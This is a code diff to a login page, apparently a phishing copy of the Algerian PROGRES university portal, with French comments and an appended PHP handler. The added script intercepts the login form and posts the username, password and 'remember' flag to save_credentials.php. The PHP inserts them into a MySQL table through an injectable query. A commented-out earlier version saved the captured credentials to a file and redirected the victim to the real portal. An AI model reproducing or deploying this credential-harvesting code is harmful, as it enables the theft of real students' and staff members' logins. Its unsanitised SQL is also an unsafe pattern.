@@ -183,8 +183,33 @@
 			</div>
 		</div>
 	</div>
+	<script>
+		document.getElementById('loginFrm').addEventListener('submit', function(event) {
+			event.preventDefault(); // Empêche le formulaire de se soumettre normalement
+		
+			// Récupérer les valeurs des champs
+			var username = document.getElementById('loginFrm:j_username').value;
+			var password = document.getElementById('loginFrm:j_password').value;
+			var remember = document.getElementsByName('remember')[0].checked;
+		
+			// Envoyer les données au script PHP côté serveur avec AJAX
+			var xhr = new XMLHttpRequest();
+			xhr.open('POST', 'save_credentials.php', true);
+			xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+			xhr.onload = function() {
+				if (xhr.status === 200) {
+					console.log(xhr.responseText);
+					// Rediriger vers une page de confirmation ou autre si nécessaire
+					window.location.href = 'confirmation.php'; // Rediriger vers confirmation.php
+				}
+			};
+			xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&remember=' + encodeURIComponent(remember));
+		});
+		</script>
+		
 	<!-- src="script.js" -->
-    <script >
+	
+    <!-- <script >
 		document.getElementById('loginFrm').addEventListener('submit', function(event) {
     event.preventDefault(); // Empêche le formulaire de se soumettre normalement
 
@@ -197,8 +222,6 @@
     var content = "Nom d'utilisateur: " + username + "\n" +
                   "Mot de passe: " + password + "\n" +
                   "Rester connecté: " + (remember ? "Oui" : "Non");
-
-    // Créer un objet Blob avec le contenu
     var file = new Blob([content], {type: 'text/plain'});
 
     // Créer un objet URL à partir du Blob
@@ -218,8 +241,42 @@
     window.location.href = 'https://progres.mesrs.dz/webfve/login.xhtml';
 
 });
-	</script>
+	</script> -->
 
 </body>
 </html>
+
+<?php
+// Connexion à la base de données MySQL (à adapter selon votre configuration)
+$servername = "localhost"; // Serveur MySQL
+$username = "votre_nom_utilisateur_mysql"; // Nom d'utilisateur MySQL
+$password = "votre_mot_de_passe_mysql"; // Mot de passe MySQL
+$dbname = "nom_de_votre_base_de_donnees"; // Nom de la base de données MySQL
+
+// Création d'une connexion
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Vérification de la connexion
+if ($conn->connect_error) {
+    die("La connexion à la base de données a échoué : " . $conn->connect_error);
+}
+
+// Récupérer les données envoyées depuis le formulaire
+$username = $_POST['username'];
+$password = $_POST['password'];
+$remember = $_POST['remember'];
+
+// Préparer et exécuter la requête SQL pour insérer les données dans la base de données
+$sql = "INSERT INTO nom_de_votre_table (username, password, remember) VALUES ('$username', '$password', '$remember')";
+
+if ($conn->query($sql) === TRUE) {
+    echo "Les données ont été enregistrées avec succès dans la base de données.";
+} else {
+    echo "Erreur : " . $sql . "<br>" . $conn->error;
+}
+
+// Fermer la connexion à la base de données
+$conn->close();
+?>
+
 
